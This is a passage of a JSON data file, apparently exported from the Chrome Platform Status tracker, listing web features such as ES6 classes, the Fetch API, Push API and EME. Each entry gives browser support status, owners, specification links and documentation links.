    "comments": "Intent to implement: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/3dLc0LIhDDk\r\nIntent to ship: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/Qpmq5Gm0c4I/cuy83f4cb0sJ",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-class-definitions",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/New_in_JavaScript/ECMAScript_6_support_in_Mozilla#New_class_syntax",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3330",
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/classeses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-classes",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Language support for classes.\r\n\r\nIn 42, shipped in strict mode. In 49, shipped outside of strict mode as well.",
    "id": 4633745457938432,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/classes-es6"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:32.496630",
      "by": "ericbidelman@google.com"
    },
    "name": "ES6 Extended Object Literals",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-object-initializer",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "arv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3516",
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/es6objectliteralenhancements/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Allows concise methods and property shorthands in object literals",
    "id": 4873630588600320,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-16 17:18:41.000010",
      "by": "ericbidelman@google.com"
    },
    "name": "Encrypted Media Extensions (EME)",
    "comments": "Historical note: A prefixed API shipped in Chrome 26 for desktop and Chrome 32 for Android (http://crbug.com/173059). It was disabled on all platforms in Chrome 47 and removed in Chrome 50.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/encrypted-media/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.mozilla.org/blog/2015/05/12/update-on-digital-rights-management-and-firefox/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "xhwang@chromium.org",
          "hbengali@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "http://crbug.com/241496",
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/bg182646.aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://www.apple.com/osx/preview/apps/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Defines a common API that may be used to discover, select and interact with Digital Rights Management systems for use with HTMLMediaElement.",
    "id": 6578378068983808,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/EncryptedMediaExtensions_API"
      ],
      "samples": [
        "https://shaka-player-demo.appspot.com/"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:18.125670",
      "by": "ericbidelman@google.com"
    },
    "name": "Fetch API",
    "comments": "Issue where we're discussing window scope specific issues., https://github.com/slightlyoff/ServiceWorker/issues/581\r\n\r\n\r\nExample of web developer views: https://www.chromestatus.com/feature/6730533392351232\r\n\r\nIE team has listed the Fetch API in their status.modern.ie dashboard and it's marked as \"Under Consideration\".",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://fetch.spec.whatwg.org/#fetch-api",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1039846",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "tyoshino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 42,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "http://crbug.com/436770",
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/fetchapi",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/prerelease/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_10_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Fetch API is a new API for loading resources in web applications. It's intended to supersede XMLHttpRequest.\r\n\r\nFetch API is already available in ServiceWorker scope. This entry is for announcing its availability in window scope.",
    "id": 6730533392351232,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2015/03/introduction-to-fetch",
        "https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/fetch-api"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-26 06:08:07.967040",
      "by": "Patket@microsoft.com"
    },
    "name": "ImageData constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#imagedata",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en/docs/Web/API/ImageData",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "sigbjornf@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "http://crbug.com/338804",
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=130668",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Instantiate new ImageData objects by way of an object constructor.",
    "id": 6200618314104832,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en/docs/Web/API/ImageData"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-04-26 06:06:23.094440",
      "by": "Patket@microsoft.com"
    },
    "name": "Notifications using Service Workers",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://notifications.spec.whatwg.org/#service-worker-api",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://lists.w3.org/Archives/Public/public-whatwg-archive/2014Jul/0048.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Web Notifications have an in-page event delivery model by default, which means that notifications cannot reliably outlive the page's lifetime. Allowing event delivery to be routed to a page's Service Worker provides a solid solution.",
    "id": 5480344312610816,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2015/03/push-notificatons-on-the-open-web"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/push-messaging-and-notifications"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-04-26 06:05:20.917080",
      "by": "Patket@microsoft.com"
    },
    "name": "Push API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://w3c.github.io/push-api/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://platform-status.mozilla.org/#push",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "mvanouwerkerk@chromium.org",
          "johnme@chromium.org",
          "owencm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=350378",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/pushapi/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Push notifications for the web",
    "id": 5416033485586432,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2015/03/push-notificatons-on-the-open-web",
        "https://developer.mozilla.org/en-US/docs/Web/API/Push_API"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/push-messaging-and-notifications"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:27.256150",
      "by": "ericbidelman@google.com"
    },
    "name": "Web/native app install banners",
    "tags": [
      "app",
      "install",
      "installability",
      "homescreen"
    ],
    "comments": "Screenshot: https://i.imgur.com/O2wGXUf.png\r\n\r\nHomescreen icon target image density bugs: https://crbug.com/479747",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "owencm@chromium.org",
          "talo@chromium.org",
          "slightlyoff@chromium.org",
          "benwells@chromium.org",
          "dfalcantara@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=459839",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Chrome 42 for Android will encourage users to add high quality sites they visit frequently to their home screen. In the future it will support the same for native apps.\r\n\r\nThis entry is for the visual aspect, not the API surface. The Manifest API surface is covered by https://www.chromestatus.com/features/4754986680451072. The event API surface is covered in https://www.chromestatus.com/features/6560913322672128",
    "id": 4540065577435136,
    "resources": {
      "docs": [
        "https://github.com/slightlyoff/AppInstallImprovements/blob/master/explainer.md",
        "http://updates.html5rocks.com/2015/03/increasing-engagement-with-app-install-banners-in-chrome-for-android"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/app-install-banner/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 06:03:10.540510",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: Deprecate setting AudioBufferSourceNode.buffer more than once",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 42
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 42,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=448960",
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Setting AudioBufferSourceNode.buffer more than once is deprecated. A deprecation message is displayed if the buffer attribute is assigned more than once. ",
    "id": 5129238722117632,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/288"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 06:00:00.037370",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: OfflineAudioContext.startRendering() returns a promise",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1087944",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 42
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 42,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=420109",
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The startRendering() method for an OfflineAudioContext now returns a promise that is resolved with the rendered audio when rendering is done.",
    "id": 5692188675538944,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#widl-OfflineAudioContext-startRendering-Promise-AudioBuffer"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/webaudio-offlinecontext-rendering"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:42.968080",
      "by": "ericbidelman@google.com"
    },
    "name": "showModalDialog",
    "comments": "Lots of discussion on Intent to Remove thread: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/xh9fPX0ijqk",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/Window.showModalDialog",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 42
        },
        "owners": [
          "jochen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 42,
        "flag": false,
        "android": 42,
        "webview": 42,
        "intervention": false
      },
      "opera": {
        "android": 29,
        "desktop": 29
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/showmodaldialog",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=79027",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Negative",
          "val": 5
        }
      }
    },
    "summary": "The global showModalDialog() method displays a modal dialog box containing a specified HTML document. This feature has an incredibly high cost in terms of code complexity since it requires us to run an event loop on top of an arbitrary JavaScript stack.  It also complicates the web platform by making task dispatch reentrant and hard to reason about.\r\n\r\nIn Chrome 37 it was disabled and in Chrome 43 it is removed.",
    "id": 5608754573737984,
    "resources": {
      "docs": [
        "http://blog.chromium.org/2014/07/disabling-showmodaldialog.html",
        "http://dev.opera.com/blog/showmodaldialog/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:14.651800",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "'any-pointer' and 'any-hover' Media Queries",
    "tags": [
      "pointer",
      "hover",
      "media",
      "query"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/2014/WD-mediaqueries-4-20140605/#any-input",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "mustaq@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 41,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "bug": "http://crbug.com/398943",
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/mediaquerieslevel4interactionmediafeaturespointerandhover?term=media%20queries%20level%204",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Media queries for determining capabilities of a UA's pointer devices",
    "id": 6460705494532096,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/@media/any-pointer",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/@media/any-hover"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/media-hover-pointer"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-08-07 21:28:20.697750",
      "by": "ericbidelman@google.com"
    },
    "name": "Blending of HTML and SVG elements",
    "tags": [
      "mix-blend-mode isolation blending"
    ],
    "comments": "Under the 'experimental webkit features' runtime flag in Chrome since Chrome 31.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/compositing-1/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=952643",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "cabanier@adobe.com",
          "rosca@adobe.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "bug": "http://crbug.com/154769",
        "intervention": false
      },
      "opera": {
        "android": 27,
        "desktop": 27
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/mixblendmode",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=131355",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Provides a way to blend an HTML or SVG element with its backdrop.\r\nThe CSS properties: mix-blend-mode and isolation.",
    "id": 6362616360337408,
    "resources": {
      "docs": [
        "https://dev.opera.com/articles/getting-to-know-css-blend-modes/",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode"
      ],
      "samples": [
        "http://codepen.io/collection/Kgshi/",
        "http://codepen.io/collection/hfxiw/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:33.471020",
      "by": "ericbidelman@google.com"
    },
    "name": "ES6 numeric literals",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://people.mozilla.org/~jorendorff/es6-draft.html#sec-literals-numeric-literals",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en/Firefox/Releases/25#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "arv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2783",
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/es6numericliterals",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-octal-and-binary-literals",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows binary and octal numeric literals using 0b101 and 0o753 respectively.",
    "id": 4930171014479872,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#Numeric_literals"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:42.114110",
      "by": "ericbidelman@google.com"
    },
    "name": "Element.computedRole and Element.computedName",
    "tags": [
      "accessibility role computedRole"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 41
        },
        "owners": [
          "aboxhall@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": true,
        "bug": "https://crbug.com/442978",
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://www.w3.org/Bugs/Public/show_bug.cgi?id=27294",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Retrieve the computed accessible role and name for the element, if any.",
    "id": 5530552681627648,
    "resources": {
      "docs": [
        "https://www.w3.org/Bugs/Public/show_bug.cgi?id=27294"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:28.659840",
      "by": "ericbidelman@google.com"
    },
    "name": "Lexical Declarations (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-let-and-const-declarations",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/35",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "littledan@chromium.org",
          "rossberg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/blockbindingsletconstfunction",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "'let' and 'const' declarations define variables/constants with block scoping in strict mode.",
    "id": 4645595339816960,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/lexical-declarations-es6"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:30.503150",
      "by": "ericbidelman@google.com"
    },
    "name": "Template Strings (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-template-literals",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/34",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "arv@chromium.org",
          "caitpotter88@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3230",
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/templatestringses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-template-literals",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Template strings are string literals allowing embedded expressions.",
    "id": 4743002513735680,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2015/01/ES6-Template-Strings",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/template_strings",
        "https://leanpub.com/understandinges6/read/#leanpub-auto-template-strings"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/template-literals-es6"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:32.601700",
      "by": "ericbidelman@google.com"
    },
    "name": "Virtual viewport pinch-zoom",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
